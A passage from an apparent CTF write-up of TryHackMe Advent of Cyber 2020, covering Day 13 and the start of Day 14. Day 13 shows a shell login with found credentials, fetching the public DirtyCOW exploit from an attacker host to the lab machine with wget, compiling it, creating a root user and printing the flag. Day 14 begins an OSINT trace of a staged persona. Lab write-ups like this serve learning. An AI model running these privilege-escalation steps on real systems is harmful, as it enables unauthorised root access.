class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Credentials: <code>santa:clauschristmas</code></p><p>If we log in with these credentials, we get shell!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Last login: Sat Nov 21 20:37:37 UTC 2020 from 10.0.2.2 on pts/2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                \ / </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">              --&gt;*&lt;-- </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                /o\ </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               /_\_\ </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">              /_/_0_\ </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">             /_o_\_\_\ </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            /_/_/_/_/o\ </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           /@\_\_\@\_\_\ </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          /_/_/O/_/_/_/_\ </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">         /_\_\_\_\_\o\_\_\ </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        /_/0/_/_/_0_/_/@/_\ </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       /_\_\_\_\_\_\_\_\_\_\ </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      /_/o/_/_/@/_/_/o/_/0/_\ </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               [___] </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">santa</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="more-enumeration">More enumeration<a href="#more-enumeration" class="hash-link" aria-label="Direct link to More enumeration" title="Direct link to More enumeration">​</a></h3><p>As suggested, we read <code>/etc/*release</code> and run <code>uname -a</code> to find info about the system.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /etc/*release</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DISTRIB_ID=Ubuntu</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DISTRIB_RELEASE=12.04</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DISTRIB_CODENAME=precise</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DISTRIB_DESCRIPTION=&quot;Ubuntu 12.04 LTS&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ uname -a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Linux christmas 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As we can see, this machine is running <code>Ubuntu 12.04</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="poking-around-the-filesystem">Poking around the filesystem<a href="#poking-around-the-filesystem" class="hash-link" aria-label="Direct link to Poking around the filesystem" title="Direct link to Poking around the filesystem">​</a></h3><p>First, let&#x27;s list the files in the current working directory (Santa&#x27;s home directory)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ls -al</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 20</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 3 santa santa 4096 Nov 21 20:37 .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 3 root  root  4096 Nov 21 20:37 ..</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwx------ 2 santa santa 4096 Nov 21 20:37 .cache</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x 1 santa santa 1422 Nov 21 20:37 christmas.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r-- 1 santa santa 2925 Nov 21 20:37 cookies_and_milk.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s read some of these file! Since the files were very long, I have put them into the day13-coal-for-christmas directory.</p><p>Unfortunately, it the <code>grinch</code> seems to have gotten to the cookies and milk first.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="dirtycow-cve-2016-5195">DirtyCOW (CVE-2016-5195)<a href="#dirtycow-cve-2016-5195" class="hash-link" aria-label="Direct link to DirtyCOW (CVE-2016-5195)" title="Direct link to DirtyCOW (CVE-2016-5195)">​</a></h3><p>Since this a relatively old version of Ubuntu that has passed the end of service, there could be a vulnerable Linux kernel exploit.</p><table><thead><tr><th>Version</th><th>Code Name</th><th>Release</th><th>End of life</th></tr></thead><tbody><tr><td>Ubuntu 20.04</td><td>Focal Fossa</td><td>April 2020</td><td>TBA</td></tr><tr><td>Ubuntu 18.04</td><td>Bionic Beaver</td><td>April 2018</td><td>April 2028</td></tr><tr><td>Ubuntu 16.04</td><td>Xenial Xerus</td><td>April 2016</td><td>April 2024</td></tr><tr><td>Ubuntu 14.04</td><td>Trusty Tahr</td><td>April 2014</td><td>April 2022</td></tr><tr><td>Ubuntu 12.04</td><td>Precise Pangolin</td><td>April 2012</td><td>April 2017</td></tr></tbody></table><p>The dossier writes:</p><blockquote><p>That C source code is a portion of a kernel exploit called DirtyCow. Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux Kernel, taking advantage of a race condition that was found in the way the Linux kernel&#x27;s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.  </p></blockquote><blockquote><p>This cookies_and_milk.txt file looks like a modified rendition of a DirtyCow exploit, usually written in C. Find a copy of that original file online, and get it on the target box. You can do this with some simple file transfer methods like netcat, or spinning up a quick Python HTTP server... or you can simply copy-and-paste it into a text editor on the box!</p></blockquote><p>So, I found <a href="https://github.com/FireFart/dirtycow/blob/master/dirty.c" target="_blank" rel="noopener noreferrer"><code>dirty.c</code></a> on GitHub from FireFart. I used wget to <a href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c" target="_blank" rel="noopener noreferrer">download</a> it from GitHub. Then I set up an http-server* for file transfer.</p><p>*I prefer using http-server since it a shorter command and it automatically reminds me of the IP and port on start. You could also use netcat or Python HTTP server as suggested.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day13-coal-for-christmas$ wget &quot;https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--2020-12-13 14:14:26--  https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.124.133</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.124.133|:443... connected.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HTTP request sent, awaiting response... 200 OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Length: 4815 (4.7K) [text/plain]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Saving to: ‘dirty.c’</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dirty.c                     100%[========================================&gt;]   4.70K  --.-KB/s    in 0s      </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020-12-13 14:14:26 (38.1 MB/s) - ‘dirty.c’ saved [4815/4815]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day13-coal-for-christmas$ http-server</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting up http-server, serving ./</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Available on:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  http://127.0.0.1:8080</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  http://172.16.57.163:8080</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  http://10.6.23.34:8080</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Hit CTRL-C to stop the server</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[Sun Dec 13 2020 14:17:03 GMT-0500 (Eastern Standard Time)]  &quot;GET /dirty.c&quot; &quot;Wget/1.13.4 (linux-gnu)&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">^Chttp-server stopped.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then on the victim box, I can simply use wget to pull the file over.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ wget 10.6.23.34:8080/dirty.c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--2020-12-13 19:17:03--  http://10.6.23.34:8080/dirty.c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connecting to 10.6.23.34:8080... connected.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HTTP request sent, awaiting response... 200 OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Length: 4815 (4.7K) [text/x-c]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Saving to: `dirty.c&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">100%[===================================================================&gt;] 4,815       --.-K/s   in 0.001s  </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020-12-13 19:17:03 (4.99 MB/s) - `dirty.c&#x27; saved [4815/4815]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As suggested by the comments in the source code of dirty.c, we can compile it with gcc and then run it.</p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">gcc -pthread dirty.c -o dirty -lcrypt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-./dirty codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-./dirty codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">/etc/passwd successfully backed up to /tmp/passwd.bak</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Please enter the new password: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Complete line:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firefart:fi.zNBXcdv/Sk:0:0:pwned:/root:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mmap: 7fc44dd38000</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We have now created a user with root privileges called <code>firefart</code> with a password of out choosing. We can then switch also switch to this user.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ su firefart</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firefart@christmas:/home/santa#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now let&#x27;s check out our home directory (aka <code>/root</code>).</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">firefart@christmas:~# cd ~/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firefart@christmas:~# pwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firefart@christmas:~# ll</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 24</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwx------  2 firefart root 4096 Nov 21 20:38 ./</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 24 firefart root 4096 Nov 21 20:38 ../</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-------  1 firefart root    0 Nov 21 20:38 .bash_history</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 firefart root 3106 Apr 19  2012 .bashrc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x  1 firefart root 1422 Nov 21 20:37 christmas.sh*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 firefart root  611 Nov 21 20:37 message_from_the_grinch.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 firefart root  140 Apr 19  2012 .profile</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-the-flag-5">Getting the flag<a href="#getting-the-flag-5" class="hash-link" aria-label="Direct link to Getting the flag" title="Direct link to Getting the flag">​</a></h3><p>Let&#x27;s read the <code>message_from_the_grinch.txt</code>...</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nice work, Santa!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Wow, this house sure was DIRTY!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">I think they deserve coal for Christmas, don&#x27;t you?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">So let&#x27;s leave some coal under the Christmas `tree`!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Let&#x27;s work together on this. Leave this text file here,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">and leave the christmas.sh script here too...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">but, create a file named `coal` in this directory!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Then, inside this directory, pipe the output</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">of the `tree` command into the `md5sum` command.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">The output of that command (the hash itself) is</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">the flag you can submit to complete this task</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">for the Advent of Cyber!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        - Yours,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                John Hammond</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                er, sorry, I mean, the Grinch</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          - THE GRINCH, SERIOUSLY</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Ok then, I guess I&#x27;ll do what he say...</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">firefart@christmas:~# touch coal</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firefart@christmas:~# tree</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|-- christmas.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|-- coal</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">`-- message_from_the_grinch.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0 directories, 3 files</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firefart@christmas:~# tree | md5sum</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">8b16f00dd3b51efadb02c1df7f8427cc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Flag: <code>8b16f00dd3b51efadb02c1df7f8427cc</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-14-wheres-rudolph">Day 14: Where&#x27;s Rudolph<a href="#day-14-wheres-rudolph" class="hash-link" aria-label="Direct link to Day 14: Where&#x27;s Rudolph" title="Direct link to Day 14: Where&#x27;s Rudolph">​</a></h2><p><em>Category: Special</em><br>
<em>Tags: OSINT</em><br>
<em>Special Contributor: The Cyber Mentor</em></p><blockquote><p>Twas the night before Christmas and Rudolph is lost Now Santa must find him, no matter the cost You have been hired to bring Rudolph back How are your OSINT skills? Follow Rudolph&#x27;s tracks...</p></blockquote><h3 class="anchor anchorWithStickyNavbar_LWe7" id="reddit">Reddit<a href="#reddit" class="hash-link" aria-label="Direct link to Reddit" title="Direct link to Reddit">​</a></h3><p>All we are given is a Reddit username: <code>IGuidetheClaus2020</code></p><p>We can view his Reddit account here: <code>https://www.reddit.com/user/IGuidetheClaus2020</code><br>
<!-- -->And we can view his comment history here: <code>https://www.reddit.com/user/IGuidetheClaus2020/comments/</code></p><p>Looking through his comment history, we can see that he was born in <code>Chicago</code>.  </p><p>If we do a Google search for <code>robert the creator of rudolph</code>, we find that Robert&#x27;s full name is <code>Robert L. May</code>  </p><p>If we search his username of Google, we find his Twitter account: <code>@IGuideClaus2020</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="twitter">Twitter<a href="#twitter" class="hash-link" aria-label="Direct link to Twitter" title="Direct link to Twitter">​</a></h3><p>We can view his Twitter account here: <code>https://twitter.com/IGuideClaus2020</code></p><p>We learn that Rudolph&#x27;s favorite TV show is the <code>Bachelorette</code>  </p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="photo-exif-data">Photo EXIF Data<a href="#photo-exif-data" class="hash-link" aria-label="Direct link to Photo EXIF Data" title="Direct link to Photo EXIF Data">​</a></h3><p><img loading="lazy" alt="chicago" src="/assets/images/lights-festival-website-9d37f29b88e5d49d2a7d7f849da13772.jpg" width="650" height="510" class="img_ev3q"></p><p>If we reverse Google Image search for the parade image, we find this <a href="https://www.thompsoncoburn.com/news-events/news/2019-12-09/thompson-coburn-floats-down-michigan-avenue-in-first-magnificent-mile-lights-festival-appearance" target="_blank" rel="noopener noreferrer">news article</a> that tells us that the parade took place in <code>Chicago, IL</code>.</p><p>We can run <code>exiftool</code> to get more info about the image.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day14-wheres-rudolph$ wget https://tcm-sec.com/wp-content/uploads/2020/11/lights-festival-website.jpg</span><br></span><span class="token-line" 